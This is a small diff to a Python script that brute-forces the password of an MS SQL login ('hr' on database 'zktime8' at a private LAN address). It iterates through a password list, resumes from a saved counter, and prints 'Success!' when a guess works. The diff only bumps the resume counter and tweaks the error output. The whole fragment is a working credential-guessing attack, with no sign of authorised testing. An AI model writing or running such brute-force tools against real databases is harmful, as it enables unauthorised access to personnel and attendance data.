@@ -82,7 +82,7 @@ def main(n):
     i = 0
     for j in password:
         i += 1
-        if i >= 1372876:  # 断点
+        if i >= 1780613:  # 断点
             try:
                 ms = MsSql(host="192.168.2.228", user="hr", pwd=''.join(tuple(j)),
                            db="zktime8")
@@ -90,7 +90,7 @@ def main(n):
                 print('Success!', j, ';', query)
                 input('Wait........')
             except Exception as e:
-                print('id:', i, '，try:', ''.join(tuple(j)), e)
+                print('id:', i, '，try:', ''.join(tuple(j)),'|', e)
             # finally:
             #     print('id:', i, '，try:', ''.join(tuple(j)), e)
 
